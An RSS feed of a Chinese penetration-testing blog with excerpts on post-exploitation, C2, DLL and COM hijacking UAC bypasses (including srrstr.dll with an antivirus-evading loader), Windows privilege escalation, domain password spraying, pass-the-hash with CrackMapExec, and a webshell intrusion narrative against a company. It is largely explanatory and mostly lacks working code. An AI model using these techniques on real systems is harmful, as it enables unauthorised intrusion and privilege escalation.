<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>内网渗透 on 倾旋的博客</title><link>https://payloads.online/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</link><description>Recent content in 内网渗透 on 倾旋的博客</description><generator>Hugo</generator><language>zh-cn</language><copyright>倾旋 All rights reserved</copyright><lastBuildDate>Sat, 30 Mar 2019 00:00:00 +0000</lastBuildDate><atom:link href="https://payloads.online/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.xml" rel="self" type="application/rss+xml"/><item><title>OWASP - 吉林沙龙《后渗透与邮件安全》 议题解读</title><link>https://payloads.online/archivers/2019-03-30/2/</link><pubDate>Sat, 30 Mar 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-03-30/2/</guid><description>&lt;blockquote>
&lt;p>在线地址：&lt;a href="https://www.bilibili.com/video/av51712186/">https://www.bilibili.com/video/av51712186/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;!-- raw HTML omitted -->
&lt;h2 id="0x00-前言">0x00 前言&lt;/h2>
&lt;p>本文的研究与收获，话费了我近一个季度的时间去掌握，写下这篇文章的意义就在于给自己一个总结，另外，由衷感谢我的前辈给予我的指导，一言一行影响着我。&lt;/p>
&lt;p>“如果某天你也有这种打算了，可能那个时候我也不一定在了，无论在不在，告诉我，我不问，你不说，我不拦，但是我想送你” - Micropoor&lt;/p>
&lt;h2 id="0x01-后渗透的定义">0x01 后渗透的定义&lt;/h2>
&lt;p>这个是一个宽泛的概念，我认为后渗透的定义就是：&lt;/p>
&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>[root@localhost ~]# ./pentest 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ==&amp;gt; “在拥有目标一定权限后的持续渗透行为。”
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="0x02-c2command-and-control简介">0x02 C2(Command and Control)简介&lt;/h2>
&lt;p>C2，其含义在安全领域中意思是命令与控制，具体的技术表现为远控木马。
是一种通常用于持续控制一个或多个目标的技术手段，这个技术手段覆盖了&lt;strong>多种&lt;/strong>网络通信（计算机交互、通信）的方式。&lt;/p></description></item><item><title>Visual Studio 调试DLL</title><link>https://payloads.online/archivers/2019-01-26/2/</link><pubDate>Sat, 26 Jan 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-01-26/2/</guid><description>&lt;p>
 &lt;img src="https://images.payloads.online/4b0d4868-4f5f-11ec-b255-00d861bf4abb.png" alt="2019-01-26-18-26-19">

&lt;/p>
&lt;p>首先这是DLL项目，找到调试选项：&lt;/p>
&lt;p>
 &lt;img src="https://images.payloads.online/4b56af1c-4f5f-11ec-bf14-00d861bf4abb.png" alt="2019-01-26-18-30-06">

&lt;/p>
&lt;p>调用rundll32 来调试：&lt;/p>
&lt;p>
 &lt;img src="https://images.payloads.online/4b915360-4f5f-11ec-ab27-00d861bf4abb.png" alt="2019-01-26-18-30-47">

&lt;/p>
&lt;p>这样就可以进行调试了。&lt;/p></description></item><item><title>Windows 2019 Bypass (UAC、Defender) to Metasploit</title><link>https://payloads.online/archivers/2019-01-26/1/</link><pubDate>Sat, 26 Jan 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-01-26/1/</guid><description>&lt;h2 id="0x00-前言">0x00 前言&lt;/h2>
&lt;p>昨天下午在小密圈看到一篇文章：https://egre55.github.io/system-properties-uac-bypass/&lt;/p>
&lt;p>文中指出 &lt;code>SystemPropertiesAdvanced.exe&lt;/code> 有DLL劫持漏洞，经过分析，在Windows 10下无法复现&lt;/p>
&lt;p>之前也做过关于DLL劫持、Bypass UAC的议题：&lt;a href="https://payloads.online/archivers/2018-12-22/1">DLL Hijacking &amp;amp; COM Hijacking ByPass UAC - 议题解读&lt;/a>&lt;/p>
&lt;p>在向下阅读前，请先掌握DLL劫持和Bypass UAC的基本知识。&lt;/p>
&lt;p>微信交流群，加我微信：Guest_Killer_0nlis。&lt;/p>
&lt;h2 id="0x01-cooolis">0x01 Cooolis&lt;/h2>
&lt;p>Cooolis是我写的一个支持MSF与Cobaltstrike上线的加载器，能够100%绕过绝大部分杀软，包含国内90%以上、Windows Defender等。&lt;/p>
&lt;p>之前发出了演示视频，在这里可以看到：&lt;a href="https://payloads.online/archivers/2019-01-21/1">Cobalt Strike - Metasploit Bypass AV&lt;/a>&lt;/p>
&lt;p>然后这个操作系统缺陷由于拥有自动权限提升的权限 &lt;code>autoElevate&lt;/code>属性，我们可以利用它来执行Cooolis，使得Coolis上线的会话同样拥有管理员权限。&lt;/p>
&lt;p>关于Bypass UAC的挖掘方法与原理，我的议题已经转化成了视频：&lt;/p>
&lt;!-- raw HTML omitted -->
&lt;h2 id="0x02-效果演示">0x02 效果演示&lt;/h2>
&lt;p>Windows 2019中的&lt;code>C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe&lt;/code>在运行时，会寻找&lt;code>srrstr.dll&lt;/code>，这个DLL文件并不存在于：&lt;/p>
&lt;ul>
&lt;li>C:\Windows\SysWOW64\srrstr.dll&lt;/li>
&lt;li>C:\Windows\System\srrstr.dll&lt;/li>
&lt;li>C:\Windows\srrstr.dll&lt;/li>
&lt;li>C:\Windows\SysWOW64\wbem\srrstr.dll&lt;/li>
&lt;li>C:\Windows\SysWOW64\WindowsPowershell\v1.0\srrstr.dll&lt;/li>
&lt;li>C:\Users&amp;lt;Username&amp;gt;\APPData\Local\Microsoft\WindowsApps\srrstr.dll&lt;/li>
&lt;/ul>
&lt;p>在最后它会寻找&lt;code>C:\Users\&amp;lt;Username&amp;gt;\APPData\Local\Microsoft\WindowsApps\&lt;/code>这个目录，而这个目录的读写是不需要触发UAC获得管理员权限来操作的。&lt;/p>
&lt;p>由此，可以利用该缺陷，将Coolis转换成DLL，上传至&lt;code>C:\Users\&amp;lt;Username&amp;gt;\APPData\Local\Microsoft\WindowsApps\&lt;/code>，紧接着执行SystemPropertiesAdvanced.exe，它会自动将&lt;code>srrstr.dll&lt;/code>加载至SystemPropertiesAdvanced.exe进程的内存，同样的，我们也就拥有了管理员权限。&lt;/p>
&lt;p>在此之前，我有想过在下列模块里做一些优化：&lt;/p></description></item><item><title>DLL Hijacking &amp; COM Hijacking ByPass UAC - 议题解读</title><link>https://payloads.online/archivers/2018-12-22/1/</link><pubDate>Sat, 22 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-22/1/</guid><description>&lt;blockquote>
&lt;p>在线地址：&lt;a href="https://www.bilibili.com/video/av51718274/">https://www.bilibili.com/video/av51718274/&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;!-- raw HTML omitted -->
&lt;h2 id="0x00-前言">0x00 前言&lt;/h2>
&lt;p>
 &lt;img src="https://images.payloads.online/44d01a48-4f5f-11ec-8721-00d861bf4abb.png" alt="">

&lt;/p>
&lt;p>本文章只是方便阅读PPT，对于深入的去理解没有太大帮助，只是做个知识索引。&lt;/p>
&lt;p>目录如下：&lt;/p>
&lt;ul>
&lt;li>何为劫持&lt;/li>
&lt;li>DLL是什么&lt;/li>
&lt;li>DLL加载的过程&lt;/li>
&lt;li>DLL劫持的原理&lt;/li>
&lt;li>实现一个DLL劫持 - DLL Main&lt;/li>
&lt;li>什么是COM&lt;/li>
&lt;li>应用程序与COM注册表的关系&lt;/li>
&lt;li>COM组件加载的过程&lt;/li>
&lt;li>COM组件劫持的原理&lt;/li>
&lt;li>实现一个COM组件劫持&lt;/li>
&lt;li>UAC简介&lt;/li>
&lt;li>ByPASS UAC的几种方式&lt;/li>
&lt;li>ByPASS UAC原理&lt;/li>
&lt;li>ByPASS UAC演示&lt;/li>
&lt;li>挖掘ByPASS UAC的方法&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>PPT共享在文末的小密圈中了&lt;/strong>&lt;/p>
&lt;h2 id="0x01-何为劫持">0x01 何为劫持&lt;/h2>
&lt;p>即：“在正常事物发生之前进行一个旁路操作”&lt;/p>
&lt;h2 id="0x02-dll是什么">0x02 DLL是什么&lt;/h2>
&lt;p>DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。 在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。&lt;/p>
&lt;p>
 &lt;img src="https://images.payloads.online/4516d88e-4f5f-11ec-971e-00d861bf4abb.png" alt="">

&lt;/p></description></item><item><title>彻底理解Windows认证 - 议题解读</title><link>https://payloads.online/archivers/2018-11-30/1/</link><pubDate>Fri, 30 Nov 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-11-30/1/</guid><description>&lt;p>在内部分享的《彻底理解Windows认证》议题解读，本次议题围绕着Windows认证分别讲解了：&lt;/p>
&lt;ul>
&lt;li>Pass The Hash&lt;/li>
&lt;li>Silver Tickets、Golden Tickets、&lt;/li>
&lt;li>Impersonation Token&lt;/li>
&lt;/ul>
&lt;p>这些技术分别能够满足我们在渗透中持续的维持权限、提权。&lt;/p>
&lt;p>作者：倾旋&lt;/p></description></item><item><title>内网渗透心得</title><link>https://payloads.online/archivers/2018-11-26/1/</link><pubDate>Mon, 26 Nov 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-11-26/1/</guid><description>&lt;h2 id="0x00-什么是内网渗透">0x00 什么是内网渗透&lt;/h2>
&lt;p>通常是拿下某个内网访问权限后在内网中渗透？&lt;/p>
&lt;h2 id="0x01-为什么会出现内网渗透这个技术名词">0x01 为什么会出现内网渗透这个技术名词？&lt;/h2>
&lt;p>因为在企业的网络建设里，有些数据资源需要保护起来，于是选择放在内网，这是一点，还有一点跟互联网地址空间、资金有关，于是NAT地址转换、端口转发技术应用的越来越多，形成了一个网关、N台服务器的形式，当某个对外服务被黑客入侵，那么黑客还会使用这个缺口继续深入，但是内网中的网络管理安全强度并没有外网那么严谨，导致Wannacry、震网等病毒统治内网，还有就是内网的服务、服务器大多采用默认配置，这并不是一个非常安全的方案，可并未重视起来。&lt;/p>
&lt;h2 id="0x02-为什么谈到内网渗透技术linux相关的较少">0x02 为什么谈到内网渗透技术，Linux相关的较少？&lt;/h2>
&lt;p>其实这个和windows的认证有关系，例如Pass The Hash、伪造票据、令牌假冒等，但是linux的认证较为单一，均采用ssh管理，并使用非对称加密。但是Windows从work group到domain，使用lm、ntlm、kerberos，不断向后兼容的过程中，之前的协议缺陷越来越多，系统补丁都更新的很频繁。你要说它不好，其实要是做好加固，完全是可以不需要内外网之分的，无非就是地址的多少、资金问题。kerberos认证协议的问世，解决了在不安全的网络中进行双向认证、且不怕中间人攻击。域，对应一个域名，一个域名一个组织\企业，这都完全是可行的。总归来说，其实内网渗透它本身不算一个技术类别，而是考验你在不同的网络环境下，对操作系统、网络基础的理解能力。内网渗透不是一个技术类别，渗透测试也不是“测试网站”、“挖掘Web漏洞”，那叫Web应用安全测试。为什么会变成这样呢？是因为HTTP普及的太快了，发展的也很迅速，之前还在玩着xss，这又迅速普及了websocket……于是大家都把“系统”当作网站，把网站当作“系统”。直面现实的话，这不是不好，正是因为这样，安全行业才能够使得更多的人关注安全、让新鲜血液注入。&lt;/p>
&lt;h2 id="0x03-内网渗透需要掌握哪些东西">0x03 内网渗透需要掌握哪些东西？&lt;/h2>
&lt;p>内网渗透只是现代攻防的一种表现，市场要比Web应用安全测试要小的多。但是你必须去掌握它，因为当木马、病毒来临时，你举手无措、你基础薄弱、你不能很快的发现问题，无法溯源、不知道木马如何落地。所以，攻防要持续学习，不管外网多么艰难，从外部进入内部的可能有很多，只是web的可能性更大。你需要掌握计算机操作系统基础知识、掌握一门或两门编程语言，必须保证一种是跨平台的、网络基础（路由、交换）、非常扎实的TCP/IP协议基础、不断持续研究的心。&lt;/p>
&lt;p>就目前来看，我发现从乙方的一些服务中能够直接转换到甲方技能的就是应急响应了，那么应急的时候，你难道还说：“我不需要懂内网渗透吗？？？？” - 倾旋 2018-11-23&lt;/p></description></item><item><title>COM Hijacking</title><link>https://payloads.online/archivers/2018-10-14/1/</link><pubDate>Sat, 13 Oct 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-10-14/1/</guid><description>&lt;h2 id="0x00-com介绍">0x00 COM介绍&lt;/h2>
&lt;p>COM是Component Object Model （组件对象模型）的缩写。&lt;/p>
&lt;p>COM是微软公司为了计算机工业的软件生产更加符合人类的行为方式开发的一种新的软件开发技术。在COM构架下，人们可以开发出各种各样的功能专一的组件，然后将它们按照需要组合起来，构成复杂的应用系统。&lt;/p>
&lt;h2 id="0x01-应用程序与com注册表的关系">0x01 应用程序与COM注册表的关系&lt;/h2>
&lt;h3 id="注册表">注册表&lt;/h3>
&lt;p>首先需要介绍一下&lt;a href="https://docs.microsoft.com/en-us/windows/desktop/sysinfo/about-the-registry">注册表&lt;/a>，注册表可以理解为一个树状结构的数据库，它具有一些特殊的数据类型用来存储一些数据满足应用程序的需要。&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th style="text-align: left">名称&lt;/th>
 &lt;th style="text-align: left">作用&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td style="text-align: left">HKEY_CLASSES_ROOT&lt;/td>
 &lt;td style="text-align: left">用于存储一些文档类型、类、类的关联属性。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: left">HKEY_CURRENT_CONFIG&lt;/td>
 &lt;td style="text-align: left">用户存储有关本地计算机系统的当前硬件配置文件信息。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: left">HKEY_CURRENT_USER&lt;/td>
 &lt;td style="text-align: left">用于存储当前用户配置项。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: left">HKEY_CURRENT_USER_LOCAL_SETTINGS&lt;/td>
 &lt;td style="text-align: left">用于存储当前用户对计算机的配置项。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: left">HKEY_LOCAL_MACHINE&lt;/td>
 &lt;td style="text-align: left">用于存储当前用户物理状态。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: left">HKEY_USERS&lt;/td>
 &lt;td style="text-align: left">用于存储新用户的默认配置项。&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;p>&lt;strong>&lt;a href="https://docs.microsoft.com/en-us/windows/desktop/sysinfo/hkey-classes-root-key">HKEY_CLASSES_ROOT&lt;/a> = HKEY_LOCAL_MACHINE + HKEY_CURRENT_USER&lt;/strong>&lt;/p></description></item><item><title>Windows 本地特权提升技巧</title><link>https://payloads.online/archivers/2018-10-08/1/</link><pubDate>Mon, 08 Oct 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-10-08/1/</guid><description>&lt;h2 id="0x00-前言">0x00 前言&lt;/h2>
&lt;p>本文主要有以下章节：&lt;/p>
&lt;ul>
&lt;li>1.服务路径权限可控提权&lt;/li>
&lt;li>2.模糊路径提权&lt;/li>
&lt;li>3.定时任务计划提权&lt;/li>
&lt;li>4.MSI安装策略提权&lt;/li>
&lt;li>5.DLL劫持提权&lt;/li>
&lt;li>6.信息搜集&lt;/li>
&lt;/ul>
&lt;p>许多事只有做了才知道。 - &lt;code>Rvn0xsy（倾旋）&lt;/code>&lt;/p>
&lt;p>写于 2018/9/17&lt;/p>
&lt;h2 id="0x01-服务路径权限可控">0x01 服务路径权限可控&lt;/h2>
&lt;p>通常情况下，一些Web控件、网络客户端会在本地注册一些服务，这些服务在开机自启动，而自启动的权限又是SYSTEM。&lt;/p>
&lt;p>在软件注册服务的时候，会在注册表中创建几个项，该项的注册表路径如下：&lt;/p>
&lt;p>&lt;code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services&lt;/code>&lt;/p>
&lt;p>我选择一个名为&lt;code>“gwservice”&lt;/code>的项，查看该项下的所有值：&lt;/p>
&lt;p>
 &lt;img src="https://images.payloads.online/28c82c82-4f5f-11ec-9e53-00d861bf4abb.png" alt="">

&lt;/p>
&lt;p>其中有一个ImagePath的名称，它的值是：&lt;/p>
&lt;p>&lt;code>C:\Program Files (x86)\Gateway\SSLVPN\gwservice.exe&lt;/code>&lt;/p>
&lt;p>可见它是一个VPN相关的服务，下面有两种提权可能：&lt;/p>
&lt;ul>
&lt;li>1.若这个注册表的修改权限当前用户可控，那就可以直接修改&lt;code>ImagePath&lt;/code>的值，指向到本地其他路径，获得这个服务的权限。&lt;/li>
&lt;li>2.若这个ImagePath所指向的目录权限可控，那么我们也可以替换&lt;code>gwservice.exe&lt;/code>，从而当服务启动的时候，就能够执行我们的应用程序（木马）。&lt;/li>
&lt;/ul>
&lt;p>但是很遗憾，第1种不行：&lt;/p>
&lt;p>
 &lt;img src="https://images.payloads.online/2901bf24-4f5f-11ec-be22-00d861bf4abb.png" alt="">

&lt;/p>
&lt;p>当前用户没有足够的权限。&lt;/p>
&lt;p>尝试第二种方法，使用“icacls”命令查看目录权限：&lt;/p>
&lt;p>
 &lt;img src="https://images.payloads.online/2942f94e-4f5f-11ec-99bc-00d861bf4abb.png" alt="">


惊喜的发现，&lt;code>“Everyone”&lt;/code>用户可以读写该目录下所有文件。&lt;/p></description></item><item><title>QQ拼音输入法6.0最新版DLL劫持 - 可利用于提权</title><link>https://payloads.online/archivers/2018-06-09/1/</link><pubDate>Sat, 09 Jun 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-06-09/1/</guid><description>&lt;h2 id="0x00-dll劫持简介">0x00 DLL劫持简介&lt;/h2>
&lt;p>《DLL劫持》技术当一个可执行文件运行时，Windows加载器将可执行模块映射到进程的地址空间中，加载器分析可执行模块的输入表，并设法找出任何需要的DLL，并将它们映射到进程的地址空间中。 &amp;ndash; 百度百科&lt;/p>
&lt;h2 id="0x01-应用程序寻找dll的过程">0x01 应用程序寻找DLL的过程&lt;/h2>
&lt;ul>
&lt;li>1.程序所在目录&lt;/li>
&lt;li>2.系统目录即 SYSTEM32 目录&lt;/li>
&lt;li>3.16位系统目录即 SYSTEM 目录&lt;/li>
&lt;li>4.Windows目录&lt;/li>
&lt;li>5.加载 DLL 时所在的当前目录&lt;/li>
&lt;li>6.PATH环境变量中列出的目录&lt;/li>
&lt;/ul>
&lt;p>首先如果在程序所在目录下未寻找到DLL，一般会在SYSTEM32目录下寻找到，那么可能会存在DLL劫持，要看注册表&lt;/p>
&lt;p>&lt;code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs&lt;/code>&lt;/p>
&lt;p>Windows操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。&lt;/p>
&lt;h2 id="0x02-寻找过程">0x02 寻找过程&lt;/h2>
&lt;p>Process Monitor一款系统进程监视软件，总体来说，Process Monitor相当于Filemon+Regmon，其中的Filemon专门用来监视系统 中的任何文件操作过程，而Regmon用来监视注册表的读写操作过程。 有了Process Monitor，使用者就可以对系统中的任何文件和 注册表操作同时进行监视和记录，通过注册表和文件读写的变化， 对于帮助诊断系统故障或是发现恶意软件、病毒或木马来说，非常 有用。 这是一个高级的 Windows 系统和应用程序监视工具，由优秀的 Sysinternals 开发，并且目前已并入微软旗下，可靠性自不用说。&lt;/p>
&lt;p>通过Process Monitor找出一些可能容易被劫持的DLL，特征一般如下：&lt;/p>
&lt;p>
 &lt;img src="https://images.payloads.online/24a8fd52-4f5f-11ec-8285-00d861bf4abb.jpg" alt="0x01">

&lt;/p>
&lt;ul>
&lt;li>ntmarta.dll(直接调用)&lt;/li>
&lt;li>profapi.dll（需要点击“配置”）&lt;/li>
&lt;/ul>
&lt;p>这两个都不在KnownDLLs中，由于开发人员调用这两个DLL的时候没有定义绝对路径，导致DLL搜索，我们可以直接在搜索到system32之前，放入我们要劫持的DLL。&lt;/p>
&lt;p>权限问题：&lt;/p>
&lt;p>如果要劫持的DLL目录被操作系统限制了必须以管理员权限才可以读写，那么我们无法利用，本文演示从低权限到高权限的DLL劫持提权。&lt;/p>
&lt;p>
 &lt;img src="https://images.payloads.online/24ed1d7a-4f5f-11ec-9f88-00d861bf4abb.jpg" alt="0x02">

&lt;/p></description></item><item><title>Windows域渗透 - 用户密码枚举</title><link>https://payloads.online/archivers/2018-05-02/1/</link><pubDate>Wed, 02 May 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-05-02/1/</guid><description>&lt;h2 id="0x00-前言">0x00 前言&lt;/h2>
&lt;p>在进行Windows域渗透的时候，面对庞大的用户账号，不知该从何下手，扫描网络服务有怕搞出大动静，肿么办呢？&lt;/p>
&lt;h2 id="0x01-powershell">0x01 Powershell&lt;/h2>
&lt;p>目前已经有很多Powershell集合脚本，用于域渗透简直舒爽&lt;/p>
&lt;p>今天推荐一款名字叫&lt;code>DomainPasswordSpray.ps1&lt;/code>的脚本，主要原理是先来抓取域用户账号，然后指定密码字典进行域认证。认证通过的就是密码正确的了。&lt;/p>
&lt;p>
 &lt;img src="https://images.payloads.online/23ba8e1a-4f5f-11ec-bac7-00d861bf4abb.png" alt="0x00">

&lt;/p>
&lt;p>&lt;strong>GitHub项目地址：https://github.com/dafthack/DomainPasswordSpray&lt;/strong>&lt;/p>
&lt;p>由于作者的脚本有一个小瑕疵，故此我改了一下，避免抛出了一些错误。&lt;/p>
&lt;p>
 &lt;img src="https://images.payloads.online/23f92d78-4f5f-11ec-a331-00d861bf4abb.png" alt="0x01">

&lt;/p>
&lt;p>&lt;strong>优化后的地址：http://payloads.online/scripts/Invoke-DomainPasswordSpray.txt&lt;/strong>&lt;/p>
&lt;h2 id="0x02-参数说明">0x02 参数说明&lt;/h2>
&lt;p>在代码的开头就已经有介绍了，我简单汉化一下。&lt;/p>
&lt;p>描述：该模块主要用于从域中收集用户列表。&lt;/p>
&lt;ul>
&lt;li>参数： &lt;code>Domain&lt;/code> 指定要测试的域名&lt;/li>
&lt;li>参数： &lt;code>RemoveDisabled&lt;/code> 尝试从用户列表删除禁用的账户&lt;/li>
&lt;li>参数： &lt;code>RemovePotentialLockouts&lt;/code> 删除锁定账户&lt;/li>
&lt;li>参数： &lt;code>UserList&lt;/code> 自定义用户列表(字典)。 如果未指定，这将自动从域中获取&lt;/li>
&lt;li>参数： &lt;code>Password&lt;/code> 指定单个密码进行口令测试&lt;/li>
&lt;li>参数： &lt;code>PasswordList&lt;/code> 指定一个密码字典&lt;/li>
&lt;li>参数： &lt;code>OutFile&lt;/code> 将结果保存到某个文件&lt;/li>
&lt;li>参数： &lt;code>Force&lt;/code> 当枚举出第一个后继续枚举，不询问&lt;/li>
&lt;/ul>
&lt;h2 id="0x03-使用说明">0x03 使用说明&lt;/h2>
&lt;p>使用例子：&lt;/p></description></item><item><title>使用CrackMapExec 进行 NTLM Hash传递攻击</title><link>https://payloads.online/archivers/2018-03-27/1/</link><pubDate>Tue, 27 Mar 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-03-27/1/</guid><description>&lt;h2 id="0x01-前言">0x01 前言&lt;/h2>
&lt;p>早期&lt;code>SMB&lt;/code>协议在网络上传输明文口令。后来出现 &lt;code>LAN Manager Challenge/Response &lt;/code>验证机制，简称&lt;code>LM&lt;/code>，它是如此简单以至很容易就被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。&lt;/p>
&lt;p>从&lt;code>Win2000&lt;/code>开始默认协议为&lt;code>Kerboros&lt;/code>，下列情况会调用&lt;code>NTLM&lt;/code>：&lt;/p>
&lt;ul>
&lt;li>遗留客户端或服务器需要登录到网络或本地时。&lt;/li>
&lt;li>UNIX客户端需要与NT服务器通话时。&lt;/li>
&lt;li>有正在使用验证&lt;code>NTLM&lt;/code>的服务器信息块&lt;code>（SMB）&lt;/code>后台程序的UNIX客户端时。&lt;/li>
&lt;li>也即认证方或被认证方有仅支持NTLM情况时。&lt;/li>
&lt;/ul>
&lt;p>它以&lt;code>挑战/响应（Challenge/Response）&lt;/code>顺序为基础。&lt;/p>
&lt;ul>
&lt;li>1.客户端发送用户名和域名到服务器。&lt;/li>
&lt;li>2.服务器转发到域控制器DC。&lt;/li>
&lt;li>3.&lt;code>DC&lt;/code>用客户端密码随机产生一个&lt;code>8字节&lt;/code>得挑战&lt;code>（Challenge）&lt;/code>，发送给服务器。&lt;/li>
&lt;li>4.服务器将挑战转发给客户端。&lt;/li>
&lt;li>5.客户端用密码经过&lt;code>hash&lt;/code>及&lt;code>DES&lt;/code>加密算法等操作得到一个加密结果响应&lt;code>（Response）&lt;/code>发送给服务器。&lt;/li>
&lt;li>6.服务器将响应转发给&lt;code>DC&lt;/code>。&lt;/li>
&lt;li>7.&lt;code>DC&lt;/code>做同样操作验证客户端响应。&lt;/li>
&lt;li>8.验证结束，返回结果通知服务器。&lt;/li>
&lt;/ul>
&lt;h2 id="0x02-ntlm对渗透的作用">0x02 NTLM对渗透的作用&lt;/h2>
&lt;p>NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限。&lt;/p>
&lt;p>最大的特点就是我们可以使用&lt;code>SMB&lt;/code>执行&lt;code>Command&lt;/code>。&lt;/p>
&lt;h2 id="0x03-crackmapexec-介绍">0x03 CrackMapExec 介绍&lt;/h2>
&lt;p>CrackMapExec提供了域环境（活动目录）渗透测试中一站式便携工具，它具有列举登录用户、通过SMB(Server Message Block)网络文件共享协议爬虫列出SMB分享列表，执行类似于Psexec的攻击、使用powerShell脚本执行自动式Mimikatz/Shellcode/DLL注入到内存中，dump NTDS.dit密码。&lt;/p>
&lt;p>WiKi:https://github.com/byt3bl33d3r/CrackMapExec/wiki&lt;/p>
&lt;h2 id="0x03-安装crackmapexec">0x03 安装CrackMapExec&lt;/h2>
&lt;h3 id="kali-linux">Kali Linux&lt;/h3>
&lt;p>&lt;code>apt-get install crackmapexec&lt;/code>&lt;/p>
&lt;h3 id="debianubuntu">Debian/Ubuntu&lt;/h3>
&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>针对某跨国企业的一次渗透测试-持续</title><link>https://payloads.online/archivers/2018-01-30/1/</link><pubDate>Tue, 30 Jan 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-01-30/1/</guid><description>&lt;p>文章涉及泄漏厂商隐私，已经删除！&lt;/p></description></item><item><title>针对国内一大厂的后渗透 - 持续</title><link>https://payloads.online/archivers/2017-12-28/1/</link><pubDate>Thu, 28 Dec 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-12-28/1/</guid><description>&lt;h2 id="0x00-前言">0x00 前言&lt;/h2>
&lt;p>此文将全部脱敏，涉及某大厂商，中间会穿插一些小的知识点与细节。&lt;/p>
&lt;h2 id="0x01-信息搜集---后渗透">0x01 信息搜集 - 后渗透&lt;/h2>
&lt;p>首先我们后渗透阶段的开始表现在 拥有一个Webshell或者通过其他漏洞获取了某些操作服务器文件的权限，亦或者能够直接反弹Shell&lt;/p>
&lt;p>这里我挑选了一个某厂边缘处的一个测试环境，在这之前我做了大量的信息搜集，没有选择直接去挖掘、利用漏洞&lt;/p>
&lt;ul>
&lt;li>操作系统&lt;/li>
&lt;li>Web服务器版本&lt;/li>
&lt;li>PHP版本&lt;/li>
&lt;li>绝对路径&lt;/li>
&lt;li>子域名&lt;/li>
&lt;li>开放端口 - 发现开启了防火墙&lt;/li>
&lt;/ul>
&lt;p>扫描到它存在&lt;code>phpMyadmin&lt;/code>，弱口令登录进入，通过常规手法SQL写入shell。&lt;/p>
&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
